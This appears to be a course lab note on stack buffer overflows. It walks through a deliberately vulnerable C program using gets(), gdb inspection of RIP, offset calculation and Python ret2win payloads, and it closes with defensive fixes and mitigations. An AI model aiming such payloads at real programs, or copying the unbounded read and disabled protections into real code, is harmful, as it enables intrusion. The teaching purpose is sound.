# PART 5.1 — Lab: Buffer Overflow

**English** · [Bahasa Indonesia](note.id.md)

[← README](../../README.md) · [Roadmap](../../INDEX.md) · **Lab inside Phase 5**

> [!NOTE]
> **Source:** [PART 5 Buffer Overflow on YouTube](https://www.youtube.com/watch?v=UVdciB72aEk)
> This lab belongs to **Phase 5 — Dynamic Analysis**: we use `gdb` to **watch** the stack being
> overwritten, then redirect control flow. Parent: PART 5 — Dynamic Analysis.
> Glossary: [section 9](#9-glossary).

**Prerequisites:** [PART 1](../../PART1/note.md) (stack frames, `RBP`/`RSP`, return address) and
[PART 2](../../PART2/note.md) (reading instructions, endianness from PART 0).

**After this lab you can:** explain why unbounded input is dangerous, compute the return-address
offset from disassembly, prove control of `RIP` in a debugger, and redirect execution into a
function that is never called (**ret2win**).

> [!WARNING]
> The target here (`vuln.c`) is a **deliberately vulnerable program you write yourself**. These
> techniques are for learning and for testing software you own or are explicitly authorized to
> test. Work in a VM (PART 0 discipline).

## Contents

- [PART 5.1 — Lab: Buffer Overflow](#part-51--lab-buffer-overflow)
  - [Contents](#contents)
  - [1. From understanding to control](#1-from-understanding-to-control)
  - [2. The target and its two flaws](#2-the-target-and-its-two-flaws)
  - [3. Modern protections and lab flags](#3-modern-protections-and-lab-flags)
  - [4. Stack anatomy and the offset](#4-stack-anatomy-and-the-offset)
  - [5. Hands-on: ret2win](#5-hands-on-ret2win)
    - [5.1 Prepare](#51-prepare)
    - [5.2 Lab 1 — Trigger the crash, and compare with protections on](#52-lab-1--trigger-the-crash-and-compare-with-protections-on)
    - [5.3 Lab 2 — Prove you control RIP](#53-lab-2--prove-you-control-rip)
    - [5.4 Lab 3 — Compute the exact offset](#54-lab-3--compute-the-exact-offset)
    - [5.5 Lab 4 — Redirect into `win()` (ret2win)](#55-lab-4--redirect-into-win-ret2win)
    - [5.6 Troubleshooting](#56-troubleshooting)
  - [6. Why this is dangerous and how to fix it](#6-why-this-is-dangerous-and-how-to-fix-it)
  - [7. Recap](#7-recap)
    - [Self-check](#self-check)
  - [8. Cliffhanger: from crash to patterns](#8-cliffhanger-from-crash-to-patterns)
  - [9. Glossary](#9-glossary)

---

## 1. From understanding to control

Through Phase 4 we **read** other people's programs: strings, instructions, the file map,
pseudo-C. This lab is the turning point: from reading to **directing**.

> [!IMPORTANT]
> One principle: if you know where a program keeps its data and how it makes decisions, you can
> change both. In PART 2 we changed a **decision** (patching `jne`). Here we change the
> **jump destination** — the address the CPU goes to when a function finishes.

Recall PART 1: `RET` takes the **return address** from the stack. That address is ordinary
writable data. If user input can write that far, the user decides where the CPU goes next.

## 2. The target and its two flaws

Create `vuln.c`:

```c
#include <stdio.h>
#include <string.h>

void win(void) {
    puts("[win] ACCESS GRANTED");
}

int main(void) {
    char input[64];
    printf("Enter the vault password: ");
    gets(input);                       // flaw 2: no length limit
    printf("You typed: %s\n", input);
    return 0;
}
```

Two properties make this program controllable:

| # | Flaw | Why it matters |
| :---: | :--- | :--- |
| 1 | `win()` exists but is **never called** | there is "success" code sitting there — our jump target |
| 2 | `gets()` reads input with **no bound** | a 64-byte buffer can receive hundreds of bytes; the rest spills onto the stack |

> [!NOTE]
> `gets()` was removed from C11 because it cannot be used safely. Some modern toolchains reject
> or warn about it. If compilation fails, replace that line with `scanf("%s", input);` — equally
> unbounded, and the lesson is identical.

> [!TIP]
> Reusing PART 1's analogy: the buffer is a 64-drop glass. `gets()` pours without checking the
> glass size. The overflow does not vanish — it spills onto the **trays next to it**, and one of
> those trays holds the CPU's destination address.

## 3. Modern protections and lab flags

Real programs have guardrails. This lab uses an unguarded target so the mechanism is visible:

| Protection | Purpose | Effect when enabled | Lab flag |
| :--- | :--- | :--- | :--- |
| **Stack canary** | a guard value just before the return address; if changed → abort | `*** stack smashing detected ***` before you control `RIP` | `-fno-stack-protector` |
| **PIE + ASLR** | code addresses randomized per run | `win()`'s address keeps moving; payload unstable | `-no-pie` |
| **NX** | stack is not executable | does **not** block this lab: we jump to existing code, not planted code | no change needed |
| **RELRO** | makes the GOT read-only | irrelevant for ret2win | — |

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
```

> [!IMPORTANT]
> `-fno-stack-protector` and `-no-pie` are **lab-only**. In real software these protections are
> exactly what you want enabled — see [section 6](#6-why-this-is-dangerous-and-how-to-fix-it).

> [!NOTE]
> `-O0` matters too: at higher optimization an uncalled function can be discarded (PART 0
> Exercise 7), and `win()` may vanish from the binary.

## 4. Stack anatomy and the offset

From PART 1, `main`'s frame looks like this (64-byte buffer):

```text
        high addresses
        +---------------------------+
        |   return address          |  ← [rbp+8]   ◀── our target (8 bytes)
        +---------------------------+
        |   saved rbp               |  ← [rbp]     (8 bytes)
        +---------------------------+
        |   input[64]               |  ← [rbp-0x40] ◀── gets() starts writing here
        +---------------------------+
        low addresses
```

`gets()` writes **from low to high addresses**, so the order is:

```text
64-byte buffer  +  8-byte saved rbp  =  72 bytes of padding  →  then the 8-byte return address
```

> [!IMPORTANT]
> 72 is **not a universal constant**. It depends on the buffer size and how much space the
> compiler allocated. Always verify from disassembly (Lab 3); never memorize it.

## 5. Hands-on: ret2win

### 5.1 Prepare

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
./vuln
```

```text
Enter the vault password: nope
You typed: nope
```

> [!NOTE]
> `bash` blocks = terminal, `gdb` = inside gdb (prompt omitted, paste-ready), `text` = output,
> `asm` = disassembly. All addresses below are **examples** — take them from your own machine.

### 5.2 Lab 1 — Trigger the crash, and compare with protections on

**Goal:** see the overflow happen, and understand why protections change the symptom.

```bash
python3 -c "print('A'*100)" | ./vuln
```

```text
Enter the vault password: You typed: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Segmentation fault
```

Now compare against a **protected** build (default flags):

```bash
gcc -g -O0 vuln.c -o vuln.protected
python3 -c "print('A'*100)" | ./vuln.protected
```

```text
*** stack smashing detected ***: terminated
Aborted
```

> [!IMPORTANT]
> **THE AHA:** Both are overflows, but the symptoms differ. `Segmentation fault` = the program
> tripped over a broken address. `stack smashing detected` = the **canary noticed the stack was
> overwritten** and deliberately stopped. Crash messages are diagnostic clues, not just errors.

### 5.3 Lab 2 — Prove you control RIP

**Goal:** see for yourself that user input reaches the CPU's instruction pointer.

```bash
gdb -q ./vuln
```

```gdb
set disassembly-flavor intel
run < <(python3 -c "print('A'*100)")
info registers rip rsp rbp
x/4gx $rsp-0x10
```

```text
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011d2 in main ()
rip            0x414141414141      0x414141414141
rsp            0x7fffffffe0a8      0x7fffffffe0a8
```

`0x41` is the ASCII code for `A`. Six `41` bytes in `RIP` means **our input was used as the
destination address**.

> [!NOTE]
> What you see may vary: either `RIP = 0x414141414141`, or a crash **right at the `ret`
> instruction** with `RIP` still pointing at `ret`. Reason: the full 8-byte value
> `0x4141414141414141` is *non-canonical* (outside x86-64's legal address range), so the CPU
> refuses before jumping. Both prove the same thing: the return address was overwritten.

> [!IMPORTANT]
> **THE AHA:** A crash is not failure — it is **proof of control**. Turning a crash into an
> exploit only means replacing `AAAA...` with a meaningful address.

### 5.4 Lab 3 — Compute the exact offset

**Goal:** derive the padding length from the binary instead of guessing.

```bash
objdump -d -M intel vuln | sed -n '/<main>:/,/ret/p'
```

```asm
main:
    push   rbp
    mov    rbp,rsp
    sub    rsp,0x40                  ; 64 bytes for the buffer
    lea    rax,[rbp-0x40]            ; buffer address
    mov    rdi,rax
    call   401050 <gets@plt>
    ...
    leave
    ret
```

Buffer at `[rbp-0x40]` → distance to the return address = `0x40 + 8` = **72 bytes**.

Verify live in the debugger:

```gdb
break *main+0x2a
run
info registers rbp
p/x $rbp+8
x/gx $rbp+8
```

```text
rbp            0x7fffffffe090      0x7fffffffe090
$1 = 0x7fffffffe098
0x7fffffffe098: 0x00007ffff7e0a2c0
```

`[rbp+8]` holds the return address into libc — that is the slot we will overwrite.

> [!TIP]
> A faster route: set a **watchpoint** on that slot (`watch *(long*)($rbp+8)`) and `continue`.
> gdb stops the moment your input starts overwriting it — covered in [PART 5](../note.md).

> [!IMPORTANT]
> **THE AHA:** An exploit offset is not trivia to memorize, it is **the result of reading the
> stack frame**. If the compiler changes the allocation (`sub rsp,0x50`), the offset changes —
> and you know how to recompute it.

### 5.5 Lab 4 — Redirect into `win()` (ret2win)

**Goal:** make the program print `[win] ACCESS GRANTED` without ever calling `win()`.

Find `win`'s address:

```bash
objdump -d -M intel vuln | grep -A2 '<win>:'
nm vuln | grep ' T win'
```

```text
0000000000401156 <win>:
  401156:	push   rbp
  401157:	mov    rbp,rsp
0000000000401156 T win
```

Build the payload: 72 bytes of padding + `win`'s address in **little-endian** (PART 0 Exercise 6):

```bash
python3 -c "import struct,sys; sys.stdout.buffer.write(b'A'*72 + struct.pack('<Q', 0x401156))" > payload.bin
xxd payload.bin | tail -2
./vuln < payload.bin
```

```text
00000040: 4141 4141 4141 4141 5611 4000 0000 0000  AAAAAAAAV.@.....
Enter the vault password: You typed: AAAAAAAA...
[win] ACCESS GRANTED
Segmentation fault
```

Notice `5611 4000 ...` — that is `0x401156` written byte-reversed, exactly the little-endian
principle from PART 0.

> [!NOTE]
> - The payload goes into a **file**, not a shell argument, because the address contains `00`
>   bytes. `gets()` reads until newline/EOF, so null bytes are fine on this path.
> - The program may crash **after** printing `[win] ...`. That is expected: once `win()` finishes,
>   the stack is already wrecked, so its `ret` goes to garbage. The lab goal was reached before
>   that crash.

> [!IMPORTANT]
> **THE AHA:** We planted no code at all. We only **rewrote one address**, and the program ran
> its own code that was never supposed to run. This class is called **ret2win** (return-to-win),
> the simplest form of *code reuse*.

### 5.6 Troubleshooting

| Symptom | Cause | Fix |
| :--- | :--- | :--- |
| `*** stack smashing detected ***` | canary enabled | rebuild with `-fno-stack-protector` |
| `win` address changes every run | PIE + ASLR enabled | add `-no-pie` |
| `win` missing from `nm` | compiler discarded it | use `-O0`, do not mark it `static` |
| Crash inside `puts`/`printf` (`movaps`) | **stack alignment** not 16 bytes | insert one `ret` instruction address before `win` |
| Compiler rejects `gets` | removed from C11 | use `scanf("%s", input)` |
| Payload does not land | wrong offset | redo Lab 3, read `sub rsp,N` on your machine |

Alignment fix (if needed):

```bash
objdump -d vuln | grep -m1 -E '\bret\b'
python3 -c "import struct,sys; p=lambda a: struct.pack('<Q',a); sys.stdout.buffer.write(b'A'*72 + p(0x40101a) + p(0x401156))" > payload.bin
./vuln < payload.bin
```

One extra `ret` shifts `RSP` by 8 bytes so `win()` is entered with correct alignment. `0x40101a`
is an example `ret` address — take it from the first command's output.

## 6. Why this is dangerous and how to fix it

Buffer overflow is one of the most consequential bug classes in internet security history; many
major worms relied on it. What makes this lab work is not a "hacker trick" but **two programming
decisions**: an unbounded read, and protections turned off.

The defensive side — fix the code, not just the flags:

```c
if (fgets(input, sizeof input, stdin) == NULL) return 1;
input[strcspn(input, "\n")] = '\0';    // strip the trailing newline
```

| Layer | Examples | Purpose |
| :--- | :--- | :--- |
| **Code** | `fgets(buf, sizeof buf, ...)`, `snprintf`, length checks | removes the root cause |
| **Compiler** | `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2` | detects overwrites at runtime |
| **Linker/OS** | PIE + ASLR, NX, RELRO | makes addresses unpredictable and the stack non-executable |
| **Process** | code review, static analysis, fuzzing | finds `gets`/`strcpy` patterns before release |

> [!IMPORTANT]
> The right order: **fix the code first**, binary protections as the second layer. Canaries and
> ASLR raise the cost of an attack; they do not remove the bug.

## 7. Recap

| Concept | What to remember |
| :--- | :--- |
| Buffer overflow | writing past a buffer's boundary overwrites neighbouring data |
| Return address | data at `[rbp+8]`; whoever controls it controls where `RET` goes |
| Offset | buffer size + 8 (saved rbp); **verify from disassembly** |
| Crash | proof of control, not failure; the message is a diagnosis |
| Canary | stack guard; symptom is `stack smashing detected`, not SIGSEGV |
| PIE/ASLR | randomizes addresses; the lab needs `-no-pie` for stability |
| NX | does not stop ret2win because we reuse existing code |
| ret2win | overwrite the return address with a target function, little-endian |
| Alignment | crash in `movaps` → insert one `ret` before the target address |
| Mitigation | bounded input in code + compiler/OS protections |

### Self-check

- [ ] Why can `gets()` never be used safely, regardless of buffer size?
- [ ] Where does the return address sit relative to `RBP`, and who put it there?
- [ ] How do you compute the padding offset from disassembly?
- [ ] How do `Segmentation fault` and `stack smashing detected` differ?
- [ ] Why does NX not stop a ret2win attack?
- [ ] Why must the target address be written little-endian?
- [ ] What is the proper code fix, as opposed to just compile flags?

## 8. Cliffhanger: from crash to patterns

You just used the stack frame pattern to **attack**. The same patterns are used to **read**:
once you can recognize the shapes of `if`, loops, and `switch` in assembly, you can find
dangerous functions like this in a foreign binary without its source.

> [!IMPORTANT]
> That is **Phase 6 — Reversing Patterns**: recognizing compiler-generated shapes, so analysis
> stops being line-reading and becomes structure-reading.

> [!NOTE]
> Deeper exploitation (shellcode, ROP, heap) belongs to **Phase 9 — Specialization**, not
> Phase 6. In this repo the lab stops at ret2win: enough to prove control-flow hijacking without
> going into payload development.

## 9. Glossary

| Term | Plain meaning |
| :--- | :--- |
| Buffer | fixed-size memory area holding data |
| Buffer overflow | writing beyond a buffer's capacity, overwriting adjacent data |
| `gets()` | C input function with no length limit; removed from C11 |
| `fgets()` | safe alternative: reads at most the buffer size |
| Return address | address the CPU jumps to after a function finishes (`[rbp+8]`) |
| Saved RBP | the caller's `RBP` stored on the stack (8 bytes) |
| Offset | byte distance from the buffer start to the target you overwrite |
| Padding | filler bytes in a payload used to reach the target |
| Payload | data crafted to trigger a specific behavior |
| Overwrite | replacing an existing value in memory |
| Segmentation fault | crash when a program touches an invalid address |
| Non-canonical address | address outside x86-64's legal range; refused before jumping |
| RIP | Instruction Pointer: address of the next instruction |
| Stack canary | guard value before the return address; changed → abort |
| Stack smashing detected | the message when a canary catches an overwrite |
| PIE / ASLR | code addresses randomized to defeat prediction |
| NX | the stack cannot be executed |
| RELRO | the GOT is made read-only |
| ret2win | overwriting the return address with an existing target function |
| Code reuse | using the program's own code instead of planting new code |
| Stack alignment | the 16-byte stack rule; violating it can crash in `movaps` |
| Watchpoint | a breakpoint that triggers when a **memory value changes** |
| Mitigation | risk reduction: code fixes plus protections |

---

[← PART 5](../note.md) · [Roadmap](../../INDEX.md) · **Next:** PART 6 — Reversing Patterns
([ID notes](../../PART6/note.id.md) · EN soon)

<div align="center">

[@T4n-Labs](https://t4nlabs.web.id/) • [@Gh0sT4n](https://gh0st4n.my.id)

</div>